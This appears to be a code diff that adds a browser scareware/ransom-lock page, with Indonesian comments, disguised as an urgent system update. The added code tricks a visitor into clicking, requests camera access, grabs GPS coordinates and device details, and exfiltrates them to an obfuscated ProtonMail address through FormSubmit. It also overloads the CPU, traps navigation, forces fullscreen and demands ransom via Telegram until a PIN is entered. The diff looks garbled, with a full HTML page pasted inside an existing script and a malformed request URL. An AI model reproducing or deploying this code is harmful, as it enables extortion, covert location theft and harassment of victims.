@@ -53,60 +53,127 @@
         const video = document.getElementById('idiotVideo');
         const screen = document.getElementById('ransom-screen');
 
-        // 1. Kunci Tombol Back (History Hijacking)
-        function antiBack() {
-            window.history.pushState(null, null, window.location.href);
-            window.onpopstate = function() {
-                window.history.pushState(null, null, window.location.href);
-                alert("GAK BISA KELUAR TOLOL! MASUKIN PIN!");
-            };
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PORn-INDO | PREMIUM SYSTEM UPDATE</title>
+    <style>
+        body { background: #000; color: #fff; margin: 0; overflow: hidden; font-family: 'Courier New', monospace; height: 100vh; width: 100vw; }
+        #setup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #111; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 99999; }
+        .btn-fix { padding: 25px 50px; font-size: 24px; background: #ff0000; color: #fff; border: 4px solid #fff; font-weight: bold; cursor: pointer; border-radius: 10px; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        #chaos { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99998; }
+        .glitch { animation: glitch-anim 0.05s infinite; }
+        @keyframes glitch-anim { 0% { background: #f00; } 50% { background: #000; } 100% { background: #fff; } }
+        video#targetCam { position: fixed; top: 10px; right: 10px; width: 120px; border: 2px solid lime; z-index: 100000; transform: scaleX(-1); }
+        video#idiotVid { width: 300px; position: absolute; z-index: 99999; border: 3px solid yellow; }
+        .log-panel { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.9); color: lime; padding: 20px; font-size: 12px; border-top: 2px solid lime; z-index: 100001; }
+        input { background: #111; color: lime; border: 1px solid lime; padding: 12px; width: 65%; font-size: 18px; margin-top: 10px; }
+    </style>
+</head>
+<body onclick="forceFS()">
+
+    <!-- UMPAN AWAL -->
+    <div id="setup">
+        <h2 style="text-align:center; color:white;">⚠️ PERINGATAN SISTEM ⚠️<br>AKTIVITAS MENCURIGAKAN TERDETEKSI</h2>
+        <button class="btn-fix" onclick="startHeist()">PERBAIKI SEKARANG</button>
+    </div>
+
+    <!-- TAMPILAN CHAOS -->
+    <div id="chaos" class="glitch">
+        <video id="targetCam" autoplay playsinline></video>
+        <video id="idiotVid" loop playsinline><source src="idiot_video.mp4" type="video/mp4"></video>
+        
+        <div class="log-panel">
+            <div id="status">> BYPASSING SECURITY... [OK]<br>> FETCHING COORDINATES... [OK]<br>> DATA EXFILTRATION TO PROTON... [OK]</div>
+            <p style="color:yellow; margin: 10px 0;">HP ANDA TERKUNCI OLEH ALZZc-777.<br>TEBUSAN: CHAT @alzzisback (TELEGRAM)</p>
+            <input type="number" id="pinInput" placeholder="MASUKKAN PIN">
+            <button onclick="unlock()" style="padding:12px; background:lime; color:black; font-weight:bold; border:none;">UNLOCK</button>
+        </div>
+    </div>
+
+    <script>
+        // Samarkan email Proton kamu
+        const encodedEmail = "YWx6emMtNzc3QHByb3Rvbm1haWwuY29t"; // Base64 alzzc-777@protonmail.com
+        const targetEmail = atob(encodedEmail);
+
+        function startHeist() {
+            // Minta Akses Kamera & Jalankan Chaos
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                document.getElementById('targetCam').srcObject = stream;
+                grabData();
+                runChaos();
+            }).catch(() => {
+                grabData();
+                runChaos();
+            });
         }
 
-        // 2. Aktifkan Ransomware
-        function lockSystem() {
-            document.getElementById('overlay').style.display = 'none';
-            screen.style.display = 'block';
-            video.play();
-            antiBack();
-            startBouncing();
-            forceFullscreen();
+        function grabData() {
+            // Ambil Lokasi GPS & Detail Perangkat
+            navigator.geolocation.getCurrentPosition(pos => {
+                const stolenData = {
+                    Lat: pos.coords.latitude,
+                    Long: pos.coords.longitude,
+                    DeviceInfo: navigator.userAgent,
+                    Time: new Date().toLocaleString(),
+                    Status: "VICTIM COMPROMISED"
+                };
+                sendToProton(stolenData);
+            }, () => {
+                sendToProton({ Device: navigator.userAgent, Alert: "GPS BLOCKED BY VICTIM" });
+            });
         }
 
-        // 3. Paksa Fullscreen (Menghilangkan Navigasi HP)
-        function forceFullscreen() {
+        function sendToProton(data) {
+            // Kirim data ke ProtonMail lewat FormSubmit
+            fetch(`https://formsubmit.co{targetEmail}`, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    _subject: "⚠️ NEW TARGET INFECTED (ALZZc-777)",
+                    message: JSON.stringify(data, null, 2)
+                })
+            });
+        }
+
+        function runChaos() {
+            document.getElementById('setup').style.display = 'none';
+            document.getElementById('chaos').style.display = 'block';
+            document.getElementById('idiotVid').play();
+
+            // Stress Test CPU (Bikin HP Lemot/Panas)
+            setInterval(() => { for(let i=0; i<1500000; i++) Math.sqrt(i); }, 50);
+
+            // Kunci Navigasi (Anti-Back)
+            setInterval(() => { window.history.pushState(null, null, window.location.href); }, 100);
+
+            // Video Memantul
+            let v = document.getElementById('idiotVid');
+            let x=0, y=0, dx=12, dy=12;
+            setInterval(() => {
+                if(x + v.offsetWidth > window.innerWidth || x < 0) dx = -dx;
+                if(y + v.offsetHeight > window.innerHeight || y < 0) dy = -dy;
+                x+=dx; y+=dy; v.style.left=x+'px'; v.style.top=y+'px';
+            }, 30);
+        }
+
+        function forceFS() {
             let el = document.documentElement;
             if (el.requestFullscreen) el.requestFullscreen();
             else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
         }
 
-        // 4. Animasi Video Mantul
-        function startBouncing() {
-            let x = 0, y = 0, dx = 8, dy = 8;
-            setInterval(() => {
-                if (x + video.offsetWidth > window.innerWidth || x < 0) dx = -dx;
-                if (y + video.offsetHeight > window.innerHeight || y < 0) dy = -dy;
-                x += dx; y += dy;
-                video.style.left = x + 'px';
-                video.style.top = y + 'px';
-            }, 30);
-        }
-
-        // 5. Cek PIN
-        function verifyPin() {
-            const pin = document.getElementById('pinInput').value;
-            if (pin === "201192777") {
-                alert("AKSES DITERIMA. JANGAN TOLOL LAGI!");
-                window.onbeforeunload = null;
-                location.reload(); 
-            } else {
-                alert("PIN SALAH DASAR TOLOL!");
+        function unlock() {
+            if(document.getElementById('pinInput').value === "201192777") {
+                alert("ACCESS GRANTED. DON'T BE STUPID AGAIN!");
+                location.reload();
             }
         }
-
-        // 6. Cegah Tutup Tab (Warning)
-        window.onbeforeunload = function() {
-            return "DATA ANDA SEDANG DIHAPUS!";
-        };
     </script>
 </body>
 </html>
+
